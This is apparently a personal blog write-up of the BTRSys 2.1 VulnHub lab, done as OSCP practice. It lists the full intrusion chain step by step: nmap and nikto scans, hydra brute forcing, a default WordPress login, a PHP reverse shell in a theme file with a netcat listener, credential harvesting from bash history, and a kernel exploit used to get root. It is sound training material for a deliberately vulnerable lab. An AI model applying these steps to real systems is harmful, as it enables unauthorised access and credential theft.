+++
title = "BTRSys 2.1"
date = 2019-02-03
[taxonomies]
tags = ["vulnhub"]
+++

`Prior to studying OSCP`{:.info}

1. Used `zenmap` GUI to scan 192.168.225.0/24 range.

	```bash
	nmap -T4 -A -v 192.168.225.1-254
	```

	Intense TCP all ports:

	```bash
	nmap -p 1-65535 -T4 -A -v 192.168.225.134
	```

	Intense UDP all ports:

	```bash
	nmap -sS -sU -T4 -A -v 192.168.225.134
	```

	Slow comprehensive scan:

	```bash
	nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 192.168.225.134
	```

2. Started enumeration process:

	```bash
	dirb http://btrsys > dirb.log
	```

	```bash
	nikto -h 192.168.225.134 > nikto.log
	```

3. **Rabbit hole** - VSftpd 3.0.3 is being hosted on port 21. Possible entry point.

	After researching for a possible exploit, I ended up using hydra to brute force logins. Found a new account `ftp:ftp` but ended up no where useful.

4. **Rabbit hole** - OpenSSHd 7.2p2 is being used on port 22. Possible entry point.

	After researching for a possible exploit, I tried this user enumeration python script but it didn't make sense to me as the timing suppose to be longer than usual.

	[https://vuldb.com/?id.89622](https://vuldb.com/?id.89622)

5. Found an entry in `robots.txt` that contained a `wordpress` directory.

	`wp-admin` has default password set as `admin:admin`

6. **FAIL** - Attempted to try and LFI and RFI using the media upload tool. Media upload tool doesn't have proper permissions to write to uploads directory. Manual LFI doesn't work either.

7. Found an already edited style.css file for the default Wordpress theme containing code for php reverse shell.

	```
	Wordpress > Appearance > Themes > Editor
	```
	
	```bash
	nc -nvlp 4444
	```

	Executed the `style.css` file by entering the URL directory - [http://btrsys/wordpress/wp-content/themes/twentyfourteen/style.css](http://btrsys/wordpress/wp-content/themes/twentyfourteen/style.css)

8. Shell obtained and `whoami` shows `www-data`. Attempting to privesc.

9. ```bash
	python3 -c "import pty;pty.spawn('/bin/bash')"
	```

10. `python` is missing on this system so `linprivchecker.py` throws an error when trying to run using `python3`. Ran `linenum.sh` script instead.

	`root:rootpassword!` - mysql credentials found in `/var/www/.bash_history` and `wp-config.php`

11. I thought about trying to brute force the login ssh credentials for btrisk account but decided to try privesc using kernel exploit:

	[https://www.exploit-db.com/exploits/44298](https://www.exploit-db.com/exploits/44298)

	Couldn't compile the exploit on BTRSys because gcc is missing. Compiled the exploit on local machine, transferred to BTRSys, and executed the file.

	```bash
	gcc 42298.c
	```

	```bash
	chmod 777 a.out
	```

	```bash
	./a.out
	```

12. ROOTED!

### Today I learned

* Discovered that you can't run netdiscover on a tun0 interface. I had to use zenmap and figure out how to scan.

```bash
hydra -t 1 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -vV btrsys ftp
```

```bash
/usr/share/john/password.lst
```

```bash
/usr/share/wordlists/rockyou.txt
```

* This command copies the path of where the exploit file is located so you can cp it later:

```bash
searchsploit -p exploits/linux/local/44298.c
```

### Efficient commands

nmap TCP simple scan:

```bash
nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oN nmap-tcp-simple.log BTRsys
```

nmap TCP detailed scan:

```bash
nmap -nvv -Pn- -sSV -p 21,22,80 --version-intensity 9 -A -oN nmap-tcp-details.log BTRsys
```

nmap UDP scan:

```bash
nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN nmap-udp.log BTRsys
```

### Improvement for next time

* When reading the results of the enumeration process, do the really easy ones first before driving into finding software exploits such as directory paths in `robots.txt`.

* Always navigate to a path that's writable (/tmp) once you get reverse shell.

* I have to figure out how to speed up the scanning process. I feel like I'm using a big gun to do such a simple job.

* Falling into rabbit holes too easily. I should scope out the difficulty of the exploit before diving into it. If it looks too complicated, it's too hard for the OSCP exam already I would think. Although, it's good practice to see how this stuff works. I'm not sure what exactly I'm reading but I should know when is a rabbit hole or not.

* I found out afterwards that gcc is installed on the machine but cannot be executed due to restricted permissions.